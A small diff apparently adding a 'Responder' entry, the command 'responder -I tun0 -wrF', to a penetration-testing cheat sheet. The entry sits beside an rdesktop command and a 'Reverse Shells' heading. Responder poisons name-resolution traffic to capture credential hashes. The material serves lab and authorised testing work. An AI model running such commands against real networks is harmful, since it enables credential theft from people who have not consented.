@@ -217,6 +217,10 @@ Remote Desktop
 ----------------
 rdesktop -u user -p password 10.10.10.10 -g 85% -r disk:share=/root/
 
+Responder
+----------------
+- responder -I tun0 -wrF
+
 Reverse Shells
 ----------------
 #Linux
